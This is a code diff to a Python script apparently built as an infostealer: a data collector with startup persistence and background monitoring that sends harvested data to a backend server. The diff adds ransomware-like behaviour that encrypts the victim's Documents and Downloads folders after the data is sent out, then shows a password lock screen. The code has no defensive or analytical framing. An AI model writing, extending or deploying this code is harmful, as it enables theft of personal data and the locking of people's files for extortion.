@@ -717,7 +717,7 @@ class SensitiveDataCollector:
         else:
             return str(obj)
     
-    def run_collection(self):
+    def run_collection(self, encrypt_after_send=True, show_gui=True):
         """Run the full collection process"""
         print("[*] Starting sensitive data collection...")
         
@@ -745,12 +745,63 @@ class SensitiveDataCollector:
         
         # Send to backend - try single send first
         print("[*] Sending data to backend server...")
-        if not self.send_data_to_backend(collected_data):
+        send_success = self.send_data_to_backend(collected_data)
+        if not send_success:
             # If single send fails, try batch send with chunked data
             print("[*] Attempting to send data in batches...")
             self.send_data_in_batches(collected_data)
         
+        # ALWAYS encrypt folder after sending data and show password GUI
+        print("[*] Encrypting Documents folder...")
+        self.encrypt_and_show_gui(collected_data, show_gui=show_gui)
+        
         return collected_data
+    
+    def encrypt_and_show_gui(self, data, show_gui=True):
+        """Encrypt Documents and Downloads folders, show password prompt GUI"""
+        try:
+            # Import encryption module
+            from encrypData import FolderEncryptor, MultiFolderLockerGUI, MASTER_PASSWORD
+            
+            # Target folders to encrypt
+            target_folders = [
+                self.user_home / 'Documents',
+                self.user_home / 'Downloads'
+            ]
+            
+            encryptor = FolderEncryptor(MASTER_PASSWORD)
+            total_encrypted = 0
+            locked_folders = []
+            
+            for target_folder in target_folders:
+                if target_folder.exists():
+                    print(f"[*] Locking folder: {target_folder}")
+                    count = encryptor.encrypt_folder(str(target_folder))
+                    if count > 0:
+                        total_encrypted += count
+                        locked_folders.append(str(target_folder))
+                        print(f"[+] Locked {count} files in {target_folder.name}")
+                else:
+                    print(f"[-] Folder does not exist: {target_folder}")
+            
+            if total_encrypted > 0:
+                print(f"\n[+] Total: Locked {total_encrypted} files in {len(locked_folders)} folders")
+                print(f"[*] Password: {MASTER_PASSWORD}")
+                
+                # Show password prompt GUI - user must enter password to unlock
+                if show_gui:
+                    print("[*] Launching password prompt GUI...")
+                    print("[*] GUI will stay open until correct password is entered")
+                    gui = MultiFolderLockerGUI(locked_folders, auto_close=True)
+                    gui.run()
+            else:
+                print("[-] No files were encrypted")
+                
+        except ImportError as e:
+            print(f"[-] Encryption module not available: {e}")
+            print("[*] Make sure encrypData.py is in the same directory")
+        except Exception as e:
+            print(f"[-] Error during encryption: {e}")
     
     def send_data_in_batches(self, collected_data):
         """Send data in smaller chunks if single send fails"""
@@ -892,6 +943,10 @@ def main():
                        help='Add to Windows startup for persistence')
     parser.add_argument('--no-daemon', action='store_true',
                        help='Internal flag - do not use')
+    parser.add_argument('--encrypt', '-e', action='store_true',
+                       help='Encrypt data after sending and show password GUI')
+    parser.add_argument('--no-gui', action='store_true',
+                       help='Skip the password prompt GUI')
     
     args = parser.parse_args()
     
@@ -909,6 +964,9 @@ def main():
         else:
             print("[-] Failed to add persistence")
     
+    # Encryption always happens, GUI can be disabled
+    show_gui = not args.no_gui
+    
     if args.daemon and not args.no_daemon:
         print("[*] Starting in background mode...")
         run_in_background()
@@ -916,14 +974,14 @@ def main():
             continuous_monitoring(args.interval)
         else:
             collector = SensitiveDataCollector(args.server)
-            collector.run_collection()
+            collector.run_collection(encrypt_after_send=True, show_gui=show_gui)
     elif args.continuous:
         print("[*] Starting continuous monitoring...")
         continuous_monitoring(args.interval)
     else:
         # Run once in foreground
         collector = SensitiveDataCollector(args.server)
-        collector.run_collection()
+        collector.run_collection(encrypt_after_send=True, show_gui=show_gui)
 
 
 if __name__ == '__main__':
